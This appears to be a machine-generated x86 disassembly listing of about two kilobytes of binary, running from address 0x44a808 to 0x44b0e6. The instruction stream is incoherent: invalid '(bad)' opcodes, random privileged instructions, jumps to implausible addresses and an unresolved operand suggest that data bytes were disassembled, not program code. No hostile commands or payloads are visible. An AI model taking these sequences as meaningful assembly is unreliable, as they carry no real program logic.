  44a808:	or     eax,0xe3322b4e
  44a80d:	in     al,0x6b
  44a80f:	ins    BYTE PTR es:[edi],dx
  44a810:	dec    ebp
  44a811:	add    eax,0xe5dd004d
  44a816:	jae    0x44a880
  44a818:	fiadd  DWORD PTR [ecx]
  44a81a:	je     0x44a860
  44a81c:	pmaxsw mm5,QWORD PTR [ebp+0x65]
  44a820:	shl    ecx,cl
  44a822:	fs (bad) 
  44a824:	call   0x9644f6ff
  44a829:	add    eax,0xed096150
  44a82e:	dec    ecx
  44a82f:	add    BYTE PTR gs:[eax],al
	...
  44a846:	add    BYTE PTR [eax],al
  44a848:	add    al,dh
  44a84a:	out    0x6d,eax
  44a84c:	gs retf 
  44a84e:	in     eax,dx
  44a84f:	imul   esp,DWORD PTR [ebp+0xe],0xffffffd9
  44a853:	pop    esp
  44a854:	arpl   WORD PTR [edx-0x61fee6fc],bp
  44a85a:	lock imul eax,DWORD PTR [ebx-0xc],0x3d4a2cc8
  44a862:	push   edi
  44a863:	cld    
  44a864:	sbb    eax,0x6e287af5
  44a869:	aaa    
  44a86a:	shr    DWORD PTR [edx+ecx*2],1
  44a86d:	and    ebp,DWORD PTR [esi+0x7df478fc]
  44a873:	sbb    eax,0x295d1c74
  44a878:	imul   ebp,DWORD PTR [eax],0x15704f89
  44a87e:	mov    ebx,DWORD PTR [ecx]
  44a880:	ins    DWORD PTR es:[edi],dx
  44a881:	sub    ebp,DWORD PTR [esi-0x7f0a9a04]
  44a887:	cs ins BYTE PTR es:[edi],dx
  44a889:	sub    DWORD PTR [eax-0x72e892e7],edx
  44a88f:	sub    al,0x63
  44a891:	mov    ch,0xad
  44a893:	cld    
  44a894:	sbb    ebp,esi
  44a896:	fidiv  DWORD PTR [edi]
  44a898:	outs   dx,BYTE PTR ds:[esi]
  44a899:	mov    bh,0x50
  44a89b:	xor    al,0x4a
  44a89d:	lods   eax,DWORD PTR ds:[esi]
  44a89e:	in     al,dx
  44a89f:	add    esi,DWORD PTR [eax]
  44a8a1:	hlt    
  44a8a2:	frstor [edx]
  44a8a4:	je     0x44a882
  44a8a6:	in     al,dx
  44a8a7:	daa    
  44a8a8:	fs mov dh,0x4c
  44a8ab:	and    DWORD PTR [ebp+0x0],esp
	...
  44a8c6:	(bad)  
  44a8c7:	dec    ecx
  44a8c8:	and    ebp,DWORD PTR [ebp-0x64]
  44a8cb:	test   BYTE PTR [ebx],0x83
  44a8ce:	hlt    
  44a8cf:	frstor [edx]
  44a8d1:	je     0x44a85f
  44a8d3:	(bad)  [esi]
  44a8d5:	imul   ecx,DWORD PTR [ebx-0x6ac1d901],0xa
  44a8dc:	sbb    DWORD PTR [ebp-0x68],ebp
  44a8df:	or     al,0x31
  44a8e1:	push   0xb0fcadab
  44a8e6:	hlt    
  44a8e7:	cli    
  44a8e8:	cmp    eax,DWORD PTR [ecx+ebx*2-0x5e]
  44a8ec:	daa    
  44a8ed:	je     0x44a940
  44a8ef:	add    eax,0x1a5024b9
  44a8f4:	les    ebx,FWORD PTR [edx-0xc]
  44a8f7:	add    al,0x96
  44a8f9:	add    al,0x41
  44a8fb:	dec    ebp
  44a8fc:	mov    ds:0xbb2a5828,eax
  44a901:	sub    BYTE PTR [ecx],bh
  44a903:	sub    al,al
  44a905:	pop    edx
  44a906:	hlt    
  44a907:	add    al,0xae
  44a909:	add    eax,DWORD PTR [esi+eiz*1-0x4d]
  44a90d:	sbb    edi,DWORD PTR [edi]
  44a90f:	es fwait
  44a911:	es or  al,0x34
  44a914:	xchg   edi,eax
  44a915:	sub    BYTE PTR [ecx],bh
  44a917:	cmp    bh,ah
  44a919:	add    esi,DWORD PTR ds:0x24b705
  44a91f:	sub    eax,0x290e1ca9
  44a924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a925:	sub    eax,DWORD PTR [eax]
  44a927:	sub    al,BYTE PTR [ecx+0x36]
	...
  44a941:	add    BYTE PTR [eax],al
  44a943:	fld    TBYTE PTR [edi]
  44a945:	jns    0x44a9a1
  44a947:	hlt    
  44a948:	add    al,0x30
  44a94a:	add    al,0xc4
  44a94c:	and    eax,0x2db61c53
  44a951:	inc    ecx
  44a952:	sub    BYTE PTR [esi-0x41d6c4d3],dh
  44a958:	and    eax,0x4a52954
  44a95d:	fiadd  WORD PTR [ecx+ebp*4]
  44a960:	sbb    BYTE PTR ds:0x19149f47,dh
  44a966:	inc    ebp
  44a967:	hlt    
  44a968:	add    al,0x17
  44a96a:	add    eax,0x370916a5
  44a96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a970:	adc    al,BYTE PTR [eax]
  44a972:	and    cl,BYTE PTR [eax-0x62fbcdda]
  44a978:	add    eax,0x138e39fa
  44a97d:	div    DWORD PTR ds:0xfd002e93
  44a983:	sbb    eax,0xf7f9ffde
  44a988:	xor    al,0x5f
  44a98a:	(bad)  
  44a98c:	inc    ebp
  44a98d:	ins    DWORD PTR es:[edi],dx
  44a98e:	mov    ah,0x41
  44a990:	push   ecx
  44a991:	push   ecx
  44a992:	jmp    0xb944e18e
  44a997:	adc    BYTE PTR [ecx],bl
  44a999:	push   0x67490ab0
  44a99e:	mov    ebx,0xc674400c
  44a9a3:	jmp    0x12dfabd
	...
  44a9c0:	imul   esi
  44a9c2:	(bad)  
  44a9c3:	mov    eax,0xa86818d8
  44a9c8:	shr    DWORD PTR [eax],cl
  44a9ca:	inc    ebx
  44a9cb:	xchg   ecx,eax
  44a9cc:	retf   
  44a9cd:	and    DWORD PTR [edx-0x66],ebp
  44a9d0:	call   0xf7e31400
  44a9d5:	sar    dh,cl
  44a9d7:	cdq    
  44a9d8:	ret    
  44a9d9:	cs dec esi
  44a9db:	stos   BYTE PTR es:[edi],al
  44a9dc:	comiss xmm7,DWORD PTR [edi]
  44a9df:	jmp    0x3a439fdb
  44a9e4:	sbb    al,0x2f
  44a9e6:	cmp    eax,0x5146204c
  44a9eb:	jmp    0x3a43a2e7
  44a9f0:	or     al,0x2f
  44a9f2:	cmp    eax,0x340a51
  44a9f7:	out    dx,al
  44a9f8:	test   BYTE PTR [edi+0x74],0x3b
  44a9fc:	mov    ecx,0xf0286e2c
  44aa01:	(bad)  
  44aa02:	(bad)  
  44aa03:	cmp    bh,dl
  44aa05:	sbb    BYTE PTR [eax+0x3a],ch
  44aa08:	stc    
  44aa09:	and    eax,0x2bd53b70
  44aa0e:	je     0x44aa46
  44aa10:	lock jnp 0x44aa12
  44aa13:	(bad)  
  44aa14:	fucom  st(1)
  44aa16:	jae    0x44aa80
  44aa18:	loopne 0x44a9fc
  44aa1a:	push   0x5cdcfa75
  44aa1f:	push   ebx
  44aa20:	in     eax,dx
  44aa21:	loop   0x44aa7d
  44aa23:	add    BYTE PTR gs:[eax],al
	...
  44aa3a:	add    BYTE PTR [eax],al
  44aa3c:	add    BYTE PTR [esi-0x61ffffc4],bh
  44aa42:	(bad)  [ebx+0x57]
  44aa45:	pushf  
  44aa46:	xor    DWORD PTR [ecx+0x2e],eax
  44aa49:	mov    cl,0xfd
  44aa4b:	imul   eax,DWORD PTR [eax],0xe
  44aa4e:	or     DWORD PTR [ebx+0x48],ecx
  44aa51:	xchg   edx,eax
  44aa52:	out    0x73,al
  44aa54:	inc    esi
  44aa55:	mov    edx,0x6f6563fd
  44aa5a:	xor    DWORD PTR [ecx+0x74],ebx
  44aa5d:	test   DWORD PTR [eax+eax*1],edi
  44aa60:	add    BYTE PTR [ebx+0x786f3b01],dl
  44aa66:	(bad)  
  44aa67:	pop    eax
  44aa68:	outs   dx,BYTE PTR ds:[esi]
  44aa69:	jno    0x44aa48
  44aa6b:	pusha  
  44aa6c:	outs   dx,BYTE PTR ds:[esi]
  44aa6d:	jo     0x44aaa4
  44aa6f:	addr16 inc ecx
  44aa71:	(bad)  
  44aa72:	in     al,dx
  44aa73:	ins    DWORD PTR es:[edi],dx
  44aa74:	push   edi
  44aa75:	pop    ebp
  44aa76:	add    DWORD PTR [edx],ebx
  44aa78:	add    DWORD PTR [esi-0x3693a307],ecx
  44aa7e:	inc    ebp
  44aa7f:	js     0x44aae6
  44aa81:	scas   al,BYTE PTR es:[edi]
  44aa82:	aad    0x73
  44aa84:	adc    cl,BYTE PTR gs:[ecx]
  44aa87:	dec    ebx
  44aa88:	dec    eax
  44aa89:	adc    BYTE PTR [ebp+0x4c],al
  44aa8c:	xor    edi,DWORD PTR [edi]
  44aa8e:	mov    ds:0x8a96c5c,eax
  44aa93:	push   ss
  44aa94:	add    dl,ah
  44aa96:	in     eax,0x73
  44aa98:	push   ebp
  44aa99:	out    dx,al
  44aa9a:	in     eax,0x69
  44aa9c:	dec    esi
  44aa9d:	in     al,dx
  44aa9e:	std    
  44aa9f:	pop    esp
  44aaa0:	inc    ebp
	...
  44aab9:	add    ch,dl
  44aabb:	cmp    eax,DWORD PTR [eax]
  44aabd:	add    ah,dh
  44aabf:	fisub  DWORD PTR [eax]
  44aac1:	pop    ebp
  44aac2:	cmp    ecx,0xfd22df2
  44aac8:	and    BYTE PTR [esp+esi*8+0x25],ch
  44aacc:	std    
  44aacd:	cmp    al,0x66
  44aacf:	or     DWORD PTR ds:0x37ff5174,ebx
  44aad5:	outs   dx,BYTE PTR ds:[esi]
  44aad6:	pop    ecx
  44aad7:	int    0x19
  44aad9:	dec    ecx
  44aada:	dec    edx
  44aadb:	push   esi
  44aadc:	inc    edi
  44aadd:	ins    BYTE PTR es:[edi],dx
  44aade:	arpl   ax,dx
  44aae0:	sbb    eax,0xfca5f46c
  44aae5:	cmp    al,0x30
  44aae7:	jg     0x44ab1e
  44aae9:	inc    esp
  44aaea:	xor    ah,BYTE PTR [eax+0x1f]
  44aaed:	imul   eax,DWORD PTR [edi+0x5a],0x32
  44aaf1:	addr16 sbb al,bl
  44aaf4:	cld    
  44aaf5:	jbe    0x44aaec
  44aaf7:	pop    esi
  44aaf8:	xor    BYTE PTR [esi+0xd],ch
  44aafb:	mov    WORD PTR [edi],fs
  44aafd:	inc    edx
  44aafe:	push   es
  44aaff:	sbb    DWORD PTR [ecx],0x41
  44ab02:	and    DWORD PTR [ebp+0x40],esp
  44ab05:	cs hlt 
  44ab07:	jne    0x44ab05
  44ab09:	cmp    al,0xb
  44ab0b:	jb     0x44ab2a
  44ab0d:	ins    DWORD PTR es:[edi],dx
  44ab0e:	fbld   TBYTE PTR [eax+0x21]
  44ab11:	imul   esi,DWORD PTR [edx-0xb9cdde1],0xffffff9d
  44ab18:	cld    
  44ab19:	cmp    al,0xcb
  44ab1b:	out    dx,al
  44ab1c:	sub    eax,0x63
	...
  44ab35:	add    BYTE PTR [eax],al
  44ab37:	aad    0x39
  44ab39:	daa    
  44ab3a:	inc    edi
  44ab3b:	fidivr DWORD PTR [esi]
  44ab3d:	cmp    BYTE PTR [edi-0x2e],bl
  44ab40:	dec    esi
  44ab41:	daa    
  44ab42:	add    ah,dh
  44ab44:	dec    ecx
  44ab45:	add    al,0x3d
  44ab47:	mov    ds:0x9a6719f8,eax
  44ab4c:	inc    esp
  44ab4d:	cmp    BYTE PTR [edi-0x6b],ah
  44ab50:	add    al,0x13
  44ab52:	sbb    eax,0x3e721a2
  44ab57:	mov    ah,0x4
  44ab59:	es pop ds
  44ab5b:	mov    bl,0x2a
  44ab5d:	add    BYTE PTR [eax],bh
  44ab5f:	fwait
  44ab60:	and    eax,0x21821d13
  44ab65:	push   ss
  44ab66:	sub    DWORD PTR [ecx+0x12],edx
  44ab69:	cmc    
  44ab6a:	sbb    al,0x60
  44ab6c:	push   ds
  44ab6d:	out    0x3,eax
  44ab6f:	sbb    eax,0x331ea605
  44ab74:	sub    edx,eax
  44ab76:	aaa    
  44ab77:	pop    ebx
  44ab78:	es ret 
  44ab7a:	sbb    al,0x42
  44ab7c:	and    ah,BYTE PTR [ebx+ebp*1+0x3c604f4]
  44ab83:	stc    
  44ab84:	sub    edx,DWORD PTR [esi-0x4acad7d8]
  44ab8a:	push   ds
  44ab8b:	sub    al,0x1e
  44ab8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ab8e:	pop    ds
  44ab8f:	inc    ebx
  44ab90:	sub    ecx,DWORD PTR [esi-0x75fadfd8]
  44ab96:	pop    ds
  44ab97:	pop    ss
  44ab98:	fcom   st(4)
  44ab9a:	fld    QWORD PTR [eax]
	...
  44abb4:	pop    ss
  44abb5:	sub    DWORD PTR [ebx+0x3],edi
  44abb8:	int    0x4
  44abba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44abbb:	xor    DWORD PTR [edi],edx
  44abbd:	es jae 0x44abe8
  44abc0:	xor    DWORD PTR [esp+eax*4],ebp
  44abc3:	xor    ecx,ebx
  44abc5:	adc    BYTE PTR [eax+0x2521d021],al
  44abcb:	sbb    eax,0x344829e0
  44abd0:	hlt    
  44abd1:	add    al,0xc9
  44abd3:	add    esi,DWORD PTR [eax-0x37d6c4df]
  44abd9:	and    DWORD PTR [edx],esi
  44abdb:	and    dl,dl
  44abdd:	and    DWORD PTR [esi+0x38],eax
  44abe0:	hlt    
  44abe1:	add    al,0x0
  44abe3:	mov    ds:0x356345f0,eax
  44abe8:	lods   al,BYTE PTR ds:[esi]
  44abe9:	inc    ebx
  44abea:	ds adc ah,bl
  44abed:	sub    DWORD PTR [eax],eax
  44abef:	aam    0xf7
  44abf1:	fldcw  WORD PTR [ebp+0xc]
  44abf4:	rcl    DWORD PTR [eax],1
  44abf6:	arpl   WORD PTR ds:0xc4cdac1,sp
  44abfc:	xlat   BYTE PTR ds:[ebx]
  44abfd:	adc    BYTE PTR [edi+0xe],ah
  44ac00:	adc    al,BYTE PTR ds:0x47f5fe00
  44ac06:	arpl   bp,di
  44ac08:	or     al,0x38
  44ac0a:	je     0x44abc2
  44ac0c:	adc    eax,0xbca6323
  44ac11:	add    eax,0x43f02200
  44ac16:	arpl   bp,dx
	...
  44ac30:	add    BYTE PTR [ebx],bh
  44ac32:	es jb  0x44ac05
  44ac35:	push   ss
  44ac36:	es cmp eax,0x27e7c8
  44ac3c:	shl    ch,0x4a
  44ac3f:	arpl   WORD PTR [edx-0x7391d415],di
  44ac45:	xor    ebx,eax
  44ac47:	call   FWORD PTR [eax-0x60a0b80b]
  44ac4d:	fadd   QWORD PTR [eax+0x3d]
  44ac50:	jmp    0xaa44814c
  44ac55:	lds    esp,FWORD PTR ds:0xd81c755f
  44ac5b:	push   0x743a2784
  44ac60:	adc    BYTE PTR ds:0xb52d6329,0x4
  44ac67:	add    BYTE PTR [ecx+0x5d6347f6],cl
  44ac6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ac6e:	and    eax,0x23a6555d
  44ac73:	push   0x0
  44ac75:	dec    ebp
  44ac76:	push   es
  44ac77:	ins    DWORD PTR es:[edi],dx
  44ac78:	add    edx,ebx
  44ac7a:	in     al,dx
  44ac7b:	pusha  
  44ac7c:	inc    esi
  44ac7d:	mov    cl,0xd1
  44ac7f:	push   0x68
  44ac81:	or     eax,0xc900db06
  44ac86:	loope  0x44acf3
  44ac88:	gs jmp 0x1d87f06f
  44ac8e:	push   es
  44ac8f:	mov    eax,ds:0x73e1be02
  44ac94:	push   esi
	...
  44acad:	add    ah,ah
  44acaf:	loope  0x44ad1f
  44acb1:	jo     0x44acb5
  44acb3:	xlat   BYTE PTR ds:[ebx]
  44acb4:	jae    0x44ad05
  44acb6:	out    dx,eax
  44acb7:	loopne 0x44acf5
  44acb9:	js     0x44ac88
  44acbb:	add    eax,0xd38e002a
  44acc0:	pop    esp
  44acc1:	popa   
  44acc2:	test   eax,0x8a4343e2
  44acc7:	add    eax,0xfe8f000b
  44accc:	jae    0x44ad10
  44acce:	mov    eax,ds:0x5affffd1
  44acd3:	inc    ecx
  44acd4:	inc    ecx
  44acd5:	xor    ebp,DWORD PTR [edi+0x616c5cb7]
  44acdb:	add    eax,0xd36b0088
  44ace0:	pop    esp
  44ace1:	gs jl  0x44acc5
  44ace4:	arpl   WORD PTR [edx+0x74],si
  44ace7:	neg    DWORD PTR [ebp+0x6f]
  44acea:	lea    eax,ds:0xe26a0081
  44acf0:	jae    0x44ad53
  44acf2:	jns    0x44acd5
  44acf4:	imul   ebp,DWORD PTR [ecx+0x73],0x430066df
  44acfb:	add    eax,0x460c534f
  44ad00:	fs fs scas eax,DWORD PTR es:[edi]
  44ad03:	loope  0x44ad6f
  44ad05:	jae    0x44acfb
  44ad07:	xlat   BYTE PTR ds:[ebx]
  44ad08:	sbb    cl,BYTE PTR [ebp-0x38]
  44ad0b:	cmp    eax,0xecd36a15
  44ad10:	add    esp,DWORD PTR [eax]
	...
  44ad2a:	add    ah,dh
  44ad2c:	repnz dec esi
  44ad2e:	aas    
  44ad2f:	mov    bh,0xdd
  44ad31:	and    BYTE PTR [edi-0x58],bl
  44ad34:	inc    eax
  44ad35:	inc    ecx
  44ad36:	jb     0x44acc9
  44ad38:	icebp  
  44ad39:	aaa    
  44ad3a:	add    ah,dh
  44ad3c:	mov    ch,0xfc
  44ad3e:	push   eax
  44ad3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ad40:	in     al,dx
  44ad41:	inc    eax
  44ad42:	jb     0x44acdd
  44ad44:	cdq    
  44ad45:	xor    BYTE PTR [ebp-0x6f],cl
  44ad48:	out    dx,eax
  44ad49:	and    BYTE PTR [ebp+0x68],bl
  44ad4c:	scas   al,BYTE PTR es:[edi]
  44ad4d:	cld    
  44ad4e:	and    ah,dh
  44ad50:	test   BYTE PTR [esi+0x3f],0x39
  44ad54:	cwde   
  44ad55:	xor    DWORD PTR [ebx+0x2a],ebp
  44ad58:	leave  
  44ad59:	xor    BYTE PTR [ecx+0x63],dh
  44ad5c:	mov    esp,0xc9424317
  44ad61:	sbb    dh,BYTE PTR [edi+eax*2-0x52]
  44ad65:	cld    
  44ad66:	xor    esp,esi
  44ad68:	jbe    0x44adb9
  44ad6a:	aas    
  44ad6b:	cmp    eax,0x18741fc7
  44ad70:	scas   al,BYTE PTR es:[edi]
  44ad71:	cld    
  44ad72:	adc    al,0xf4
  44ad74:	outs   dx,BYTE PTR ds:[esi]
  44ad75:	dec    edi
  44ad76:	aas    
  44ad77:	aaa    
  44ad78:	jb     0x44ad95
  44ad7a:	ins    DWORD PTR es:[edi],dx
  44ad7b:	sbb    DWORD PTR [ecx+0x32],esp
  44ad7e:	arpl   WORD PTR [edx],bx
  44ad80:	jp     0x44ad7e
  44ad82:	inc    esi
  44ad83:	hlt    
  44ad84:	dec    esi
  44ad85:	dec    edi
  44ad86:	aas    
  44ad87:	daa    
  44ad88:	mov    DWORD PTR [edx],ebx
  44ad8a:	fs hlt 
  44ad8c:	popa   
  44ad8d:	cld    
  44ad8e:	push   eax
	...
  44ada7:	add    bh,al
  44ada9:	ins    BYTE PTR es:[edi],dx
  44adaa:	dec    esi
  44adab:	arpl   di,dx
  44adad:	paddw  mm2,QWORD PTR [eax-0x39]
  44adb1:	add    al,0x15
  44adb3:	dec    ebx
  44adb4:	and    ebx,edx
  44adb6:	or     BYTE PTR [eax],ah
  44adb8:	fsubr  DWORD PTR [eax]
  44adba:	out    0x3,eax
  44adbc:	jecxz  0x44adc2
  44adbe:	es and edx,ecx
  44adc1:	adc    BYTE PTR [ebx],ch
  44adc3:	and    DWORD PTR [eax-0x16deccdf],esp
  44adc9:	and    DWORD PTR ds:0x401e9b30,esi
  44adcf:	daa    
  44add0:	mov    ebx,0xa2420c10
  44add5:	daa    
  44add6:	or     al,0x57
  44add8:	and    BYTE PTR [edi],0x15
  44addb:	and    esp,esi
  44addd:	add    al,0x30
  44addf:	add    al,0xb9
  44ade1:	and    ebp,esi
  44ade3:	das    
  44ade4:	cmp    eax,0x391a0415
  44ade9:	push   ds
  44adea:	imul   BYTE PTR [edi]
  44adec:	push   edi
  44aded:	sub    dl,BYTE PTR [esi]
  44adef:	xor    BYTE PTR [ebp+0x13],cl
  44adf2:	int3   
  44adf3:	push   edx
  44adf4:	hlt    
  44adf5:	add    al,0xf5
  44adf7:	add    ecx,DWORD PTR [ecx]
  44adf9:	and    dl,ch
  44adfb:	das    
  44adfc:	add    DWORD PTR [ecx],ebp
  44adfe:	mov    edx,0xbb345736
  44ae03:	sbb    ah,BYTE PTR [edx]
  44ae05:	and    ah,bh
  44ae07:	add    eax,DWORD PTR ds:0x419706
	...
  44ae25:	cmp    al,0x4e
  44ae27:	mov    esp,0x9b130d33
  44ae2c:	inc    esi
  44ae2d:	pop    ss
  44ae2e:	adc    edx,DWORD PTR [ebx-0x6ad7ffaa]
  44ae34:	and    ah,dh
  44ae36:	add    al,0xbb
  44ae38:	add    edi,DWORD PTR [ecx-0x48d08adf]
  44ae3e:	es je  0x44ae59
  44ae41:	sub    DWORD PTR [edx],esp
  44ae43:	add    BYTE PTR [ebx+0x13],bh
  44ae46:	and    BYTE PTR [edx-0x80],ah
  44ae49:	adc    bh,BYTE PTR [eax]
  44ae4b:	je     0x44ae99
  44ae4d:	or     eax,DWORD PTR [eax+0x6a]
  44ae50:	cmp    al,BYTE PTR [esi+ebp*1]
  44ae53:	outs   dx,BYTE PTR ds:[esi]
  44ae54:	dec    esp
  44ae55:	clc    
  44ae56:	jecxz  0x44ae57
  44ae58:	sub    DWORD PTR ds:0xe52d7427,edx
  44ae5e:	adc    al,0x6c
  44ae60:	push   eax
  44ae61:	shl    DWORD PTR [edi],cl
  44ae63:	je     0x44aeb1
  44ae65:	mov    ebx,0xf9356e23
  44ae6a:	and    ah,BYTE PTR [edi+0xa]
  44ae6d:	fst    DWORD PTR [eax]
  44ae6f:	arpl   WORD PTR [edx],bp
  44ae71:	out    dx,eax
  44ae72:	sub    dh,BYTE PTR [esp+ecx*1-0x30]
  44ae76:	adc    BYTE PTR [eax],al
  44ae78:	div    eax
  44ae7a:	xor    al,0x42
  44ae7c:	and    DWORD PTR ds:0x220e701d,esi
  44ae82:	adc    DWORD PTR ds:0x4d112a0c,edi
  44ae88:	cmc    
	...
  44aea1:	add    dh,bh
  44aea3:	arpl   WORD PTR es:[edi+ebx*1-0x8bdfffb],bp
  44aeab:	xlat   BYTE PTR ds:[ebx]
  44aeac:	ins    DWORD PTR es:[edi],dx
  44aead:	rol    BYTE PTR [edi],1
  44aeaf:	adc    DWORD PTR [ebx-0x41],edx
  44aeb2:	pop    es
  44aeb3:	daa    
  44aeb4:	imul   edi,DWORD PTR [ebp-0x5a8bc82c],0xe95f10d0
  44aebe:	not    edi
  44aec0:	dec    ebp
  44aec1:	nop
  44aec2:	inc    edi
  44aec3:	xor    DWORD PTR ds:0x6c22addb,ebp
  44aec9:	(bad)  
  44aeca:	mul    DWORD PTR [edi]
  44aecc:	add    BYTE PTR [eax-0x649cef23],ah
  44aed2:	frstor [ecx]
  44aed4:	je     0x44aed6
  44aed6:	sahf   
  44aed7:	rcr    BYTE PTR [eax+0x63],1
  44aeda:	xchg   BYTE PTR ds:0x28c6c6a,dh
  44aee0:	push   ecx
  44aee1:	add    BYTE PTR [ebp+0xc7073e6],dl
  44aee7:	out    0x5c,al
  44aee9:	jb     0x44aebf
  44aeeb:	fldenv [ebp+0x66]
  44aeee:	mov    edx,0x9c000041
  44aef3:	add    BYTE PTR [ecx+0x6e],al
  44aef6:	icebp  
  44aef7:	cmc    
  44aef8:	imul   ebp,DWORD PTR [esi-0x50],0xbb6f3ad4
  44aeff:	cli    
  44af00:	pop    esp
  44af01:	arpl   cx,sp
  44af03:	inc    ecx
	...
  44af1c:	add    BYTE PTR [eax],al
  44af1e:	add    dl,dl
  44af20:	add    BYTE PTR [eax+0x74],cl
  44af23:	loope  0x44aef5
  44af25:	inc    esi
  44af26:	jo     0x44af18
  44af28:	cli    
  44af29:	dec    ecx
  44af2a:	gs fsubr st(5),st
  44af2d:	pop    esp
  44af2e:	jae    0x44af21
  44af30:	inc    edx
  44af31:	add    BYTE PTR [eax],al
  44af33:	sidtd  [eax+0x74]
  44af37:	loope  0x44af0a
  44af39:	cmp    BYTE PTR [ecx+esi*8+0x2e],ah
  44af3d:	pop    ebp
  44af3e:	jno    0x44aef0
  44af40:	imul   BYTE PTR [edx+0x74]
  44af43:	test   esi,esi
  44af45:	pop    eax
  44af46:	fs mov al,0xcf
  44af49:	push   0x41
  44af4b:	int    0x1
  44af4d:	push   ebx
  44af4e:	add    BYTE PTR [ebp-0x1b],ah
  44af51:	jae    0x44afc3
  44af53:	mov    ?,esi
  44af55:	gs fs jg 0x44af4f
  44af59:	push   0x73d0b075
  44af5e:	inc    ecx
  44af5f:	popf   
  44af60:	add    DWORD PTR [edi+0x73fb4400],ecx
  44af66:	gs hlt 
  44af68:	jns    0x44af80
  44af6a:	arpl   WORD PTR [eax],ax
  44af6c:	ja     0x44af9a
  44af6e:	arpl   dx,sp
  44af70:	ins    BYTE PTR es:[edi],dx
  44af71:	cld    
  44af72:	fs hlt 
  44af74:	push   esp
  44af75:	push   ss
  44af76:	je     0x44af51
  44af78:	sbb    DWORD PTR [edi],edx
  44af7a:	arpl   ax,sp
  44af7c:	push   0x10
  44af7e:	imul   eax,edi,0x5f3c48
	...
  44af9c:	fidivr DWORD PTR [edi]
  44af9e:	sbb    BYTE PTR [ebx-0xc],ah
  44afa1:	iret   
  44afa2:	add    ecx,DWORD PTR [eax-0x40]
  44afa5:	das    
  44afa6:	xor    al,0x4d
  44afa8:	cdq    
  44afa9:	sub    eax,0xdc914e20
  44afae:	sub    BYTE PTR [ebx-0x59],ah
  44afb1:	xlat   BYTE PTR ds:[ebx]
  44afb2:	cmp    BYTE PTR [eax-0x4b],bh
  44afb5:	stos   DWORD PTR es:[edi],eax
  44afb6:	cld    
  44afb7:	pop    edx
  44afb8:	hlt    
  44afb9:	shr    DWORD PTR [edi],cl
  44afbb:	je     0x44af41
  44afbd:	ficomp DWORD PTR [eax]
  44afbf:	push   0xffffff98
  44afc1:	fstp   DWORD PTR [eax]
  44afc3:	outs   dx,DWORD PTR ds:[esi]
  44afc4:	add    DWORD PTR [eax],0x6397433
  44afca:	dec    edi
  44afcb:	add    ah,dh
  44afcd:	into   
  44afce:	cld    
  44afcf:	inc    esi
  44afd0:	push   edx
  44afd1:	xchg   edx,eax
  44afd2:	sbb    DWORD PTR [esi+0x4a],ebp
  44afd5:	or     DWORD PTR [eax],esi
  44afd7:	dec    ebp
  44afd8:	pop    ecx
  44afd9:	mov    dl,0x53
  44afdb:	je     0x44b032
  44afdd:	mov    edx,0xbd376d29
  44afe2:	adc    BYTE PTR [esi+edx*2-0x43],ch
  44afe6:	and    esp,DWORD PTR [ebp+0x35]
  44afe9:	sahf   
  44afea:	cld    
  44afeb:	xchg   esp,eax
  44afec:	hlt    
  44afed:	push   esp
  44afee:	push   ss
  44afef:	je     0x44b00a
  44aff1:	push   eax
  44aff2:	push   ss
  44aff3:	arpl   WORD PTR [eax],sp
  44aff5:	ins    DWORD PTR es:[edi],dx
  44aff6:	sub    DWORD PTR [ebx+0x6],esp
  44aff9:	add    eax,0x192b3fa0
  44affe:	mov    BYTE PTR [edx+0x0],al
	...
  44b019:	push   es
  44b01a:	adc    BYTE PTR es:[edi],0x1b
  44b01e:	daa    
  44b01f:	jnp    0x44b03f
  44b021:	hlt    
  44b022:	add    al,0x47
  44b024:	add    esi,DWORD PTR [ebx-0x2de18cde]
  44b02a:	and    cl,BYTE PTR [edi+ebp*1+0x1f8829aa]
  44b031:	mov    dh,0x1d
  44b033:	push   ebx
  44b034:	and    DWORD PTR [edi+0x5d04280c],esi
  44b03a:	add    eax,0x29c01620
  44b03f:	push   ebp
  44b040:	push   ss
  44b041:	xchg   edi,eax
  44b042:	sbb    BYTE PTR ds:0x2128cb21,dl
  44b048:	sbb    eax,0x3e72990
  44b04d:	dec    eax
  44b04e:	add    eax,0x29881620
  44b053:	adc    eax,0x36189716
  44b058:	and    DWORD PTR [eax-0x6ccfe8bd],ecx
  44b05e:	and    edi,ecx
  44b060:	inc    esp
  44b061:	hlt    
  44b062:	add    al,0x21
  44b064:	add    al,0x3c
  44b066:	sbb    ebx,esi
  44b068:	xor    esi,DWORD PTR [ecx]
  44b06a:	sub    al,BYTE PTR [ecx]
  44b06c:	and    BYTE PTR [edx],ch
  44b06e:	sub    bh,al
  44b070:	xor    BYTE PTR [edi+0x18],dl
  44b073:	fisttp DWORD PTR [esi-0xc]
  44b076:	add    al,0xa3
  44b078:	add    esi,DWORD PTR ds:0x50db2a
	...
  44b096:	dec    edx
  44b097:	and    DWORD PTR [esi-0x33e2aedc],esp
  44b09d:	inc    eax
  44b09e:	push   ds
  44b09f:	sbb    DWORD PTR [ebp+0x233b2c],esi
  44b0a5:	iret   
  44b0a6:	add    dh,BYTE PTR [esi]
  44b0a8:	add    BYTE PTR [ebp-0x8],dh
  44b0ab:	dec    ebx
  44b0ac:	push   0xffffff9d
  44b0ae:	aam    0x22
  44b0b0:	push   0xffffff84
  44b0b2:	rol    DWORD PTR [ecx+0x63],cl
  44b0b5:	popf   
  44b0b6:	sbb    DWORD PTR es:[edi-0x6b],ebx
  44b0ba:	and    al,0x22
  44b0bc:	cmp    eax,0x5e210388
  44b0c1:	mov    BYTE PTR [esi],dl
  44b0c3:	sub    dl,BYTE PTR [ecx-0x17]
  44b0c6:	test   DWORD PTR [ecx+0x0],0x701923a1
  44b0cd:	sub    BYTE PTR [ecx+ebp*1],dl
  44b0d0:	dec    esi
  44b0d1:	inc    esp
  44b0d2:	or     DWORD PTR [eax],ebx
  44b0d4:	arpl   WORD PTR [edx+0x4],bx
  44b0d7:	cmp    eax,0x27d44863
  44b0dc:	outs   dx,BYTE PTR ds:[esi]
  44b0dd:	cmp    bh,BYTE PTR [ebx-0x8a3fffc]
  44b0e3:	dec    ebx
  44b0e4:	push   0x3d
  44b0e6:	aad    0x22
